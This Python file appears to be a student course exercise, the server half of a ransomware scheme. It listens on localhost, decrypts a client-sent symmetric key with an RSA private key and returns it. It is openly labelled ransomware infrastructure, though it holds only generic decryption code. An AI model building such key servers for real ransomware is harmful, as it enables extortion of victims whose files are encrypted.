#FILE			: Server.py
#PROJECT		: INFO2231
#PROGRAMMER		: Zijia Cao
#FIRST VERSION	: 2023/02/05
#DESCRIPTION	: Server of the Ransomware. It will wait for the client's connect
#				  and decrypt the symmetric Key that send by client
import socketserver
from threading import Thread
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet


class ClientHandler(socketserver.BaseRequestHandler):

    def handle(self):
        encrypted_key = self.request.recv(1024)
        #for some reason, altough next line came from the textbook, but it does not work.
        #print("Implement decryption of data" + encrypted_key)
		
		#load the private key to decrypt the SymmertricKey
        with open("private_key.key", "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                None
            )
       
       #decrypt the SymmertricKey
        decryptedSymmertricKey = private_key.decrypt(encrypted_key,
			padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            	algorithm=hashes.SHA256(),
                label=None
            )
        )
		
		#send it back
        self.request.sendall(decryptedSymmertricKey)

        
if __name__ == "__main__":
	#create the Tcp Server
	try:
		HOST,PORT="127.0.0.1",23138
		print("Server up.")
		tcpServer = socketserver.TCPServer((HOST,PORT),ClientHandler)
		CONNECTION_NUM = 16
	
		for i in range(CONNECTION_NUM):
			t = Thread(target=tcpServer.serve_forever)
			t.daemon = True
			t.start()
		
		tcpServer.serve_forever()
	except KeyboardInterrupt:
		tcpServer.shutdown()
	
